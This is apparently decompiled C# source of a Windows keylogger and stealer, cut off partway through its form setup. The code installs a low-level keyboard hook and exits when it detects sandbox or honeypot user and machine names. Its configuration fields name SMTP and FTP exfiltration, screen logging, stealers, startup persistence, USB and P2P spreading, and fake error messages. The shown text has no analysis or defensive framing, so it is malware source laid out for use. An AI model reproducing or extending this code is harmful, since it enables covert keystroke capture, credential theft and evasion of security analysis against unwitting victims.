using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;
using ns2;

namespace ns1;

internal sealed class Form1 : Form
{
	public sealed class Class5
	{
		internal struct Struct0
		{
			public int int_0;

			public int int_1;

			public int int_2;

			public int int_3;

			public int int_4;
		}

		internal delegate int Delegate0(int int_0, int int_1, ref Struct0 struct0_0);

		public delegate void Delegate1(Keys keys_0);

		public delegate void Delegate2(Keys keys_0);

		internal static Delegate1 delegate1_0;

		internal static Delegate2 delegate2_0;

		internal static int int_0;

		private static Delegate0 delegate0_0;

		public Class5()
		{
			delegate0_0 = Class34.smethod_25;
			int_0 = Class34.SetWindowsHookExA(13, delegate0_0, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		void object.Finalize()
		{
			Class34.UnhookWindowsHookEx(int_0);
			base.Finalize();
		}
	}

	public sealed class Class6
	{
		internal static void smethod_0()
		{
			int try0000_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			List<string> list = default(List<string>);
			List<string>.Enumerator enumerator = default(List<string>.Enumerator);
			string current = default(string);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0007;
					case 255:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0007;
							case 3:
								goto IL_0010;
							case 4:
								goto IL_001e;
							case 5:
								goto IL_002c;
							case 6:
								goto IL_003a;
							case 7:
								goto IL_0048;
							case 8:
								goto IL_0056;
							case 9:
								goto IL_0064;
							case 10:
								goto IL_0080;
							case 11:
								goto IL_0093;
							case 12:
							case 13:
								goto IL_009d;
							default:
								goto end_IL_0000;
							case 14:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_0093:
						num = 11;
						Environment.Exit(0);
						goto IL_009d;
						IL_0007:
						num = 2;
						list = new List<string>();
						goto IL_0010;
						IL_0010:
						num = 3;
						list.Add("UserName");
						goto IL_001e;
						IL_001e:
						num = 4;
						list.Add("User");
						goto IL_002c;
						IL_002c:
						num = 5;
						list.Add("honey");
						goto IL_003a;
						IL_003a:
						num = 6;
						list.Add("sandbox");
						goto IL_0048;
						IL_0048:
						num = 7;
						list.Add("currentuser");
						goto IL_0056;
						IL_0056:
						num = 8;
						list.Add("User");
						goto IL_0064;
						IL_0064:
						num = 9;
						enumerator = list.GetEnumerator();
						goto IL_006f;
						IL_006f:
						if (enumerator.MoveNext())
						{
							current = enumerator.Current;
							goto IL_0080;
						}
						((IDisposable)enumerator).Dispose();
						goto end_IL_0000_2;
						IL_009d:
						num = 13;
						goto IL_006f;
						IL_0080:
						num = 10;
						if (Operators.CompareString(Environment.UserName, current, false) == 0)
						{
							goto IL_0093;
						}
						goto IL_009d;
						end_IL_0000:
						break;
					}
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 255;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_2:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		internal static void smethod_1()
		{
			int try0000_dispatch = -1;
			int num3 = default(int);
			int num2 = default(int);
			int num = default(int);
			List<string> list = default(List<string>);
			List<string>.Enumerator enumerator = default(List<string>.Enumerator);
			string current = default(string);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0007;
					case 236:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0007;
							case 3:
								goto IL_0010;
							case 4:
								goto IL_001e;
							case 5:
								goto IL_002c;
							case 6:
								goto IL_003a;
							case 7:
								goto IL_0048;
							case 8:
								goto IL_0056;
							case 9:
								goto IL_0071;
							case 10:
								goto IL_0084;
							case 11:
							case 12:
								goto IL_008e;
							default:
								goto end_IL_0000;
							case 13:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_0084:
						num = 10;
						Environment.Exit(0);
						goto IL_008e;
						IL_0007:
						num = 2;
						list = new List<string>();
						goto IL_0010;
						IL_0010:
						num = 3;
						list.Add("ComputerName");
						goto IL_001e;
						IL_001e:
						num = 4;
						list.Add("COMPUTERNAME");
						goto IL_002c;
						IL_002c:
						num = 5;
						list.Add("DELL-D3E62F7E26");
						goto IL_003a;
						IL_003a:
						num = 6;
						list.Add("DWI-9625AC2E275");
						goto IL_0048;
						IL_0048:
						num = 7;
						list.Add("MICHAEL-F156CF7");
						goto IL_0056;
						IL_0056:
						num = 8;
						enumerator = list.GetEnumerator();
						goto IL_0060;
						IL_0060:
						if (enumerator.MoveNext())
						{
							current = enumerator.Current;
							goto IL_0071;
						}
						((IDisposable)enumerator).Dispose();
						goto end_IL_0000_2;
						IL_008e:
						num = 12;
						goto IL_0060;
						IL_0071:
						num = 9;
						if (Operators.CompareString(Environment.MachineName, current, false) == 0)
						{
							goto IL_0084;
						}
						goto IL_008e;
						end_IL_0000:
						break;
					}
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 236;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0000_2:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
	}

	[Flags]
	public enum Enum0
	{
		flag_0 = 1,
		flag_1 = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct1
	{
		public int int_0;

		public Enum0 enum0_0;

		public IntPtr intptr_0;

		public string string_0;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct2
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	private IContainer icontainer_0;

	private TextBox textBox_0;

	private TextBox textBox_1;

	private TextBox textBox_2;

	private TextBox textBox_3;

	private Label label_0;

	private Label label_1;

	private Label label_2;

	private Label label_3;

	private Label label_4;

	private Label label_5;

	private Label label_6;

	private Label label_7;

	private Label label_8;

	private Label label_9;

	private Label label_10;

	private Label label_11;

	private Label label_12;

	private Label label_13;

	private Label label_14;

	private Label label_15;

	private Label label_16;

	private Label label_17;

	private Label label_18;

	private Label label_19;

	private Label label_20;

	private Label label_21;

	private Label label_22;

	private Label label_23;

	private Label label_24;

	private Label label_25;

	private Label label_26;

	private Label label_27;

	private Label label_28;

	private Label label_29;

	private Label label_30;

	private Label label_31;

	private Label label_32;

	private TextBox textBox_4;

	private Timer timer_0;

	private Timer timer_1;

	private Timer timer_2;

	private Label label_33;

	private TextBox textBox_5;

	private TextBox textBox_6;

	private TextBox textBox_7;

	private TextBox textBox_8;

	private TextBox textBox_9;

	private Label label_34;

	private Label label_35;

	private Label label_36;

	private TextBox textBox_10;

	private TextBox textBox_11;

	private Label label_37;

	private ListBox listBox_0;

	private Timer timer_3;

	private TextBox textBox_12;

	private Label label_38;

	private Label label_39;

	private Label label_40;

	private Label label_41;

	private Timer timer_4;

	private Timer timer_5;

	private Timer timer_6;

	private TextBox textBox_13;

	private TextBox textBox_14;

	private TextBox textBox_15;

	private TextBox textBox_16;

	private Label label_42;

	private TextBox textBox_17;

	private TextBox textBox_18;

	private TextBox textBox_19;

	private Label label_43;

	private Label label_44;

	private Label label_45;

	private Label label_46;

	private Label label_47;

	private Label label_48;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private string string_11;

	private string string_12;

	private string string_13;

	private string string_14;

	private string string_15;

	private string string_16;

	private string string_17;

	private string string_18;

	private string string_19;

	private string string_20;

	private string string_21;

	private string string_22;

	private string string_23;

	private string string_24;

	private string string_25;

	private string string_26;

	private string string_27;

	private string string_28;

	private string string_29;

	private string string_30;

	private string string_31;

	private string string_32;

	private string string_33;

	private string string_34;

	private string string_35;

	private string string_36;

	private string string_37;

	private string string_38;

	private string string_39;

	private string string_40;

	private string string_41;

	private string string_42;

	private string string_43;

	private string string_44;

	internal string string_45;

	internal string string_46;

	internal string string_47;

	internal string string_48;

	internal string string_49;

	internal string string_50;

	internal string string_51;

	internal string string_52;

	internal Class16 class16_0;

	internal string string_53;

	internal string string_54;

	internal string string_55;

	internal Class11 class11_0;

	internal Class10 class10_0;

	private Class9 class9_0;

	internal string string_56;

	internal string string_57;

	internal string string_58;

	internal string string_59;

	internal string string_60;

	internal string string_61;

	internal string string_62;

	internal string string_63;

	internal RegistryKey registryKey_0;

	internal RegistryKey registryKey_1;

	internal RegistryKey registryKey_2;

	internal RegistryKey registryKey_3;

	internal RegistryKey registryKey_4;

	internal RegistryKey registryKey_5;

	internal string string_64;

	internal string string_65;

	internal string string_66;

	internal string string_67;

	internal string string_68;

	internal string string_69;

	internal string string_70;

	internal string string_71;

	internal string string_72;

	internal string string_73;

	private Class5 class5_0;

	private string string_74;

	internal string string_75;

	private ManagementEventWatcher managementEventWatcher_0;

	public string string_76;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		string_37 = "highckcisrtg/ahf89qu4uq9qur9e9ir9qu9rujncjnajfduaufjanfjudhfanfjnjaujw$%#*VSHBVDKafmiarenaf97(Dffafdghjykiuishsfgr5456afadghtrytfffutuiobxnkd";
		string_45 = Environment.GetFolderPath(Environment.SpecialFolder.Templates);
		string_48 = "";
		class16_0 = new Class16();
		class11_0 = new Class11();
		class10_0 = new Class10();
		class9_0 = new Class9();
		string_61 = Environment.NewLine;
		string_63 = string_45 + "\\cdkeys.txt";
		string_70 = Conversions.ToString(1);
		string_72 = DateTime.Now.ToString().Replace("/", "-").Replace(" ", "---")
			.Replace(":", "-");
		vmethod_152(new Class5());
		string_74 = null;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Expected O, but got Unknown
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cf: Expected O, but got Unknown
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e0: Expected O, but got Unknown
		//IL_01e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01eb: Expected O, but got Unknown
		//IL_01ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f6: Expected O, but got Unknown
		//IL_01f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0201: Expected O, but got Unknown
		//IL_0202: Unknown result type (might be due to invalid IL or missing references)
		//IL_020c: Expected O, but got Unknown
		//IL_020d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0217: Expected O, but got Unknown
		//IL_0218: Unknown result type (might be due to invalid IL or missing references)
		//IL_0222: Expected O, but got Unknown
		//IL_0223: Unknown result type (might be due to invalid IL or missing references)
		//IL_022d: Expected O, but got Unknown
		//IL_022e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0238: Expected O, but got Unknown
		//IL_0239: Unknown result type (might be due to invalid IL or missing references)
		//IL_0243: Expected O, but got Unknown
		//IL_0244: Unknown result type (might be due to invalid IL or missing references)
		//IL_024e: Expected O, but got Unknown
		//IL_024f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0259: Expected O, but got Unknown
		//IL_025a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0264: Expected O, but got Unknown
		//IL_0265: Unknown result type (might be due to invalid IL or missing references)
		//IL_026f: Expected O, but got Unknown
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0280: Expected O, but got Unknown
		//IL_0281: Unknown result type (might be due to invalid IL or missing references)
		//IL_028b: Expected O, but got Unknown
		//IL_028c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0296: Expected O, but got Unknown
		//IL_0297: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a1: Expected O, but got Unknown
		//IL_02a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ac: Expected O, but got Unknown
		//IL_02ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b7: Expected O, but got Unknown
		//IL_02be: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c8: Expected O, but got Unknown
		//IL_02cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d9: Expected O, but got Unknown
		//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ea: Expected O, but got Unknown
		//IL_02eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f5: Expected O, but got Unknown
		//IL_02f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0300: Expected O, but got Unknown
		//IL_0301: Unknown result type (might be due to invalid IL or missing references)
		//IL_030b: Expected O, but got Unknown
		//IL_030c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0316: Expected O, but got Unknown
		//IL_0317: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Expected O, but got Unknown
		//IL_0322: Unknown result type (might be due to invalid IL or missing references)
		//IL_032c: Expected O, but got Unknown
		//IL_032d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0337: Expected O, but got Unknown
		//IL_0338: Unknown result type (might be due to invalid IL or missing references)
		//IL_0342: Expected O, but got Unknown
		//IL_0343: Unknown result type (might be due to invalid IL or missing references)
		//IL_034d: Expected O, but got Unknown
		//IL_034e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0358: Expected O, but got Unknown
		//IL_0359: Unknown result type (might be due to invalid IL or missing references)
		//IL_0363: Expected O, but got Unknown
		//IL_0364: Unknown result type (might be due to invalid IL or missing references)
		//IL_036e: Expected O, but got Unknown
		//IL_036f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0379: Expected O, but got Unknown
		//IL_037a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0384: Expected O, but got Unknown
		//IL_1652: Unknown result type (might be due to invalid IL or missing references)
		//IL_165c: Expected O, but got Unknown
		//IL_16df: Unknown result type (might be due to invalid IL or missing references)
		//IL_16e9: Expected O, but got Unknown
		//IL_1779: Unknown result type (might be due to invalid IL or missing references)
		//IL_1783: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new TextBox());
		vmethod_3(new TextBox());
		vmethod_5(new TextBox());
		vmethod_7(new TextBox());
		vmethod_9(new Label());
		vmethod_11(new Label());
		vmethod_13(new Label());
		vmethod_15(new Label());
		vmethod_17(new Label());
		vmethod_19(new Label());
		vmethod_21(new Label());
		vmethod_23(new Label());
		vmethod_25(new Label());
		vmethod_27(new Label());
		vmethod_29(new Label());
		vmethod_31(new Label());
		vmethod_33(new Label());
		vmethod_35(new Label());
		vmethod_37(new Label());
		vmethod_39(new Label());
		vmethod_41(new Label());
		vmethod_43(new Label());
		vmethod_45(new Label());
		vmethod_47(new Label());
		vmethod_49(new Label());
		vmethod_51(new Label());
		vmethod_53(new Label());
		vmethod_55(new Label());
		vmethod_57(new Label());
		vmethod_59(new Label());
		vmethod_61(new Label());
		vmethod_63(new Label());
		vmethod_65(new Label());
		vmethod_67(new Label());
		vmethod_69(new Label());
		vmethod_71(new Label());
		vmethod_73(new Label());
		vmethod_75(new TextBox());
		vmethod_77(new Timer(icontainer_0));
		vmethod_79(new Timer(icontainer_0));
		vmethod_81(new Timer(icontainer_0));
		vmethod_83(new Label());
		vmethod_85(new TextBox());
		vmethod_87(new TextBox());
		vmethod_89(new TextBox());
		vmethod_91(new TextBox());
		vmethod_93(new TextBox());
		vmethod_95(new Label());
		vmethod_97(new Label());
		vmethod_99(new Label());
		vmethod_101(new TextBox());
		vmethod_103(new TextBox());
		vmethod_105(new Label());
		vmethod_107(new ListBox());
		vmethod_109(new Timer(icontainer_0));
		vmethod_111(new TextBox());
		vmethod_113(new Label());
		vmethod_115(new Label());
		vmethod_117(new Label());
		vmethod_119(new Label());
		vmethod_120(new Timer(icontainer_0));
		vmethod_121(new Timer(icontainer_0));
		vmethod_123(new Timer(icontainer_0));
		vmethod_125(new TextBox());
		vmethod_127(new TextBox());
		vmethod_129(new TextBox());
		vmethod_131(new TextBox());
		vmethod_133(new Label());
		vmethod_135(new TextBox());
		vmethod_137(new TextBox());
		vmethod_139(new TextBox());
		vmethod_141(new Label());
		vmethod_143(new Label());
		vmethod_145(new Label());
		vmethod_147(new Label());
		vmethod_149(new Label());
		vmethod_151(new Label());
		((Control)this).SuspendLayout();
		TextBox obj = vmethod_0();
		Point location = new Point(308, 68);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("TextBox4");
		TextBox obj2 = vmethod_0();
		Size size = new Size(138, 20);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(126);
		TextBox obj3 = vmethod_2();
		location = new Point(308, 42);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("TextBox3");
		TextBox obj4 = vmethod_2();
		size = new Size(138, 20);
		((Control)obj4).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(125);
		TextBox obj5 = vmethod_4();
		location = new Point(308, 16);
		((Control)obj5).set_Location(location);
		((Control)vmethod_4()).set_Name("TextBox2");
		TextBox obj6 = vmethod_4();
		size = new Size(138, 20);
		((Control)obj6).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(124);
		TextBox obj7 = vmethod_6();
		location = new Point(22, 12);
		((Control)obj7).set_Location(location);
		vmethod_6().set_Multiline(true);
		((Control)vmethod_6()).set_Name("TextBox1");
		vmethod_6().set_ScrollBars((ScrollBars)2);
		TextBox obj8 = vmethod_6();
		size = new Size(280, 226);
		((Control)obj8).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(123);
		vmethod_8().set_AutoSize(true);
		Label obj9 = vmethod_8();
		location = new Point(90, 259);
		((Control)obj9).set_Location(location);
		((Control)vmethod_8()).set_Name("Label1");
		Label obj10 = vmethod_8();
		size = new Size(56, 13);
		((Control)obj10).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(127);
		vmethod_8().set_Text("numberval");
		vmethod_10().set_AutoSize(true);
		Label obj11 = vmethod_10();
		location = new Point(90, 294);
		((Control)obj11).set_Location(location);
		((Control)vmethod_10()).set_Name("Label2");
		Label obj12 = vmethod_10();
		size = new Size(49, 13);
		((Control)obj12).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(128);
		vmethod_10().set_Text("smtp|gmil");
		vmethod_12().set_AutoSize(true);
		Label obj13 = vmethod_12();
		location = new Point(93, 331);
		((Control)obj13).set_Location(location);
		((Control)vmethod_12()).set_Name("Label3");
		Label obj14 = vmethod_12();
		size = new Size(45, 13);
		((Control)obj14).set_Size(size);
		((Control)vmethod_12()).set_TabIndex(129);
		vmethod_12().set_Text("ftpfolder");
		vmethod_14().set_AutoSize(true);
		Label obj15 = vmethod_14();
		location = new Point(93, 365);
		((Control)obj15).set_Location(location);
		((Control)vmethod_14()).set_Name("Label4");
		Label obj16 = vmethod_14();
		size = new Size(29, 13);
		((Control)obj16).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(130);
		vmethod_14().set_Text("smtp");
		vmethod_16().set_AutoSize(true);
		Label obj17 = vmethod_16();
		location = new Point(96, 388);
		((Control)obj17).set_Location(location);
		((Control)vmethod_16()).set_Name("Label5");
		Label obj18 = vmethod_16();
		size = new Size(25, 13);
		((Control)obj18).set_Size(size);
		((Control)vmethod_16()).set_TabIndex(131);
		vmethod_16().set_Text("port");
		vmethod_18().set_AutoSize(true);
		Label obj19 = vmethod_18();
		location = new Point(89, 416);
		((Control)obj19).set_Location(location);
		((Control)vmethod_18()).set_Name("Label6");
		Label obj20 = vmethod_18();
		size = new Size(56, 13);
		((Control)obj20).set_Size(size);
		((Control)vmethod_18()).set_TabIndex(132);
		vmethod_18().set_Text("encryption");
		vmethod_20().set_AutoSize(true);
		Label obj21 = vmethod_20();
		location = new Point(99, 443);
		((Control)obj21).set_Location(location);
		((Control)vmethod_20()).set_Name("Label7");
		Label obj22 = vmethod_20();
		size = new Size(29, 13);
		((Control)obj22).set_Size(size);
		((Control)vmethod_20()).set_TabIndex(133);
		vmethod_20().set_Text("skey");
		vmethod_22().set_AutoSize(true);
		Label obj23 = vmethod_22();
		location = new Point(47, 473);
		((Control)obj23).set_Location(location);
		((Control)vmethod_22()).set_Name("Label8");
		Label obj24 = vmethod_22();
		size = new Size(35, 13);
		((Control)obj24).set_Size(size);
		((Control)vmethod_22()).set_TabIndex(134);
		vmethod_22().set_Text("anties");
		vmethod_24().set_AutoSize(true);
		Label obj25 = vmethod_24();
		location = new Point(207, 259);
		((Control)obj25).set_Location(location);
		((Control)vmethod_24()).set_Name("Label9");
		Label obj26 = vmethod_24();
		size = new Size(16, 13);
		((Control)obj26).set_Size(size);
		((Control)vmethod_24()).set_TabIndex(135);
		vmethod_24().set_Text("rd");
		vmethod_26().set_AutoSize(true);
		Label obj27 = vmethod_26();
		location = new Point(210, 276);
		((Control)obj27).set_Location(location);
		((Control)vmethod_26()).set_Name("Label10");
		Label obj28 = vmethod_26();
		size = new Size(27, 13);
		((Control)obj28).set_Size(size);
		((Control)vmethod_26()).set_TabIndex(136);
		vmethod_26().set_Text("rdurl");
		vmethod_28().set_AutoSize(true);
		Label obj29 = vmethod_28();
		location = new Point(210, 294);
		((Control)obj29).set_Location(location);
		((Control)vmethod_28()).set_Name("Label11");
		Label obj30 = vmethod_28();
		size = new Size(55, 13);
		((Control)obj30).set_Size(size);
		((Control)vmethod_28()).set_TabIndex(137);
		vmethod_28().set_Text("rdfilename");
		vmethod_30().set_AutoSize(true);
		Label obj31 = vmethod_30();
		location = new Point(238, 333);
		((Control)obj31).set_Location(location);
		((Control)vmethod_30()).set_Name("Label12");
		Label obj32 = vmethod_30();
		size = new Size(28, 13);
		((Control)obj32).set_Size(size);
		((Control)vmethod_30()).set_TabIndex(138);
		vmethod_30().set_Text("fake");
		vmethod_32().set_AutoSize(true);
		Label obj33 = vmethod_32();
		location = new Point(238, 362);
		((Control)obj33).set_Location(location);
		((Control)vmethod_32()).set_Name("Label13");
		Label obj34 = vmethod_32();
		size = new Size(45, 13);
		((Control)obj34).set_Size(size);
		((Control)vmethod_32()).set_TabIndex(139);
		vmethod_32().set_Text("fakesub");
		vmethod_34().set_AutoSize(true);
		Label obj35 = vmethod_34();
		location = new Point(238, 389);
		((Control)obj35).set_Location(location);
		((Control)vmethod_34()).set_Name("Label14");
		Label obj36 = vmethod_34();
		size = new Size(51, 13);
		((Control)obj36).set_Size(size);
		((Control)vmethod_34()).set_TabIndex(140);
		vmethod_34().set_Text("fakebody");
		vmethod_36().set_AutoSize(true);
		Label obj37 = vmethod_36();
		location = new Point(244, 413);
		((Control)obj37).set_Location(location);
		((Control)vmethod_36()).set_Name("Label15");
		Label obj38 = vmethod_36();
		size = new Size(52, 13);
		((Control)obj38).set_Size(size);
		((Control)vmethod_36()).set_TabIndex(141);
		vmethod_36().set_Text("fake error");
		vmethod_38().set_AutoSize(true);
		Label obj39 = vmethod_38();
		location = new Point(247, 439);
		((Control)obj39).set_Location(location);
		((Control)vmethod_38()).set_Name("Label16");
		Label obj40 = vmethod_38();
		size = new Size(39, 13);
		((Control)obj40).set_Size(size);
		((Control)vmethod_38()).set_TabIndex(142);
		vmethod_38().set_Text("startup");
		vmethod_40().set_AutoSize(true);
		Label obj41 = vmethod_40();
		location = new Point(241, 456);
		((Control)obj41).set_Location(location);
		((Control)vmethod_40()).set_Name("Label17");
		Label obj42 = vmethod_40();
		size = new Size(24, 13);
		((Control)obj42).set_Size(size);
		((Control)vmethod_40()).set_TabIndex(143);
		vmethod_40().set_Text("usb");
		vmethod_42().set_AutoSize(true);
		Label obj43 = vmethod_42();
		location = new Point(228, 482);
		((Control)obj43).set_Location(location);
		((Control)vmethod_42()).set_Name("Label18");
		Label obj44 = vmethod_42();
		size = new Size(25, 13);
		((Control)obj44).set_Size(size);
		((Control)vmethod_42()).set_TabIndex(144);
		vmethod_42().set_Text("p2p");
		vmethod_44().set_AutoSize(true);
		Label obj45 = vmethod_44();
		location = new Point(318, 252);
		((Control)obj45).set_Location(location);
		((Control)vmethod_44()).set_Name("Label19");
		Label obj46 = vmethod_44();
		size = new Size(68, 13);
		((Control)obj46).set_Size(size);
		((Control)vmethod_44()).set_TabIndex(145);
		vmethod_44().set_Text("screenlogger");
		vmethod_46().set_AutoSize(true);
		Label obj47 = vmethod_46();
		location = new Point(327, 287);
		((Control)obj47).set_Location(location);
		((Control)vmethod_46()).set_Name("Label20");
		Label obj48 = vmethod_46();
		size = new Size(43, 13);
		((Control)obj48).set_Size(size);
		((Control)vmethod_46()).set_TabIndex(146);
		vmethod_46().set_Text("stealers");
		vmethod_48().set_AutoSize(true);
		Label obj49 = vmethod_48();
		location = new Point(330, 323);
		((Control)obj49).set_Location(location);
		((Control)vmethod_48()).set_Name("Label21");
		Label obj50 = vmethod_48();
		size = new Size(56, 13);
		((Control)obj50).set_Size(size);
		((Control)vmethod_48()).set_TabIndex(147);
		vmethod_48().set_Text("disablethis");
		vmethod_50().set_AutoSize(true);
